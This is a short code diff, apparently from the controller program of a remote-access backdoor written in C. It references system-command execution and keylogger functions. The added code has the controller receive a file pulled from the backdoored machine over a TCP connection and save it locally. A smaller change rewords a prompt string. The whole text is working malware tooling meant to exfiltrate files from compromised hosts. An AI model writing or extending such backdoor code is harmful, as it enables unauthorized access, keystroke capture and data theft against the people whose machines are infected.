@@ -90,12 +90,30 @@ static void executeSystemCall(netInfo *info, char *commandData)
 static void findFile(netInfo *info, char *commandData)
 {
     int backdoorSocket = 0;
+    int bytesRead = 0;
+    char buffer[PATH_MAX];
+    FILE *file = NULL;
+    
+    // Create the file for saving data
+    if ((file = fopen(commandData, "w+")) == NULL)
+    {
+        systemFatal("Unable to create a file");
+    }
     
     // Send the command to the backdoor
     sendCommand(info, FIND_FILE, commandData);
     
     // Wait for the response from the backdoor
     backdoorSocket = acceptReturningTcpConnection();
+    
+    // Receive the data and write it to the file
+    while ((bytesRead = recv(backdoorSocket, buffer, PATH_MAX, 0)) > 0)
+    {
+        fwrite(buffer, sizeof(char), bytesRead, file);
+    }
+    
+    // Close the file
+    fclose(file);
 }
 
 static void keylogger(netInfo *info)
@@ -289,7 +307,7 @@ static int getUserInput(char *commandData, int command)
     if (command == EXECUTE_SYSTEM_CALL)
         printf("Enter command, max %d characters\n", PATH_MAX);
     else
-        printf("Enter filename, max %d characters\n", PATH_MAX);
+        printf("Enter file name, max %d characters\n", PATH_MAX);
     
     // Obtain the entry
     if (fgets(commandData + 2, PATH_MAX, stdin) != NULL)
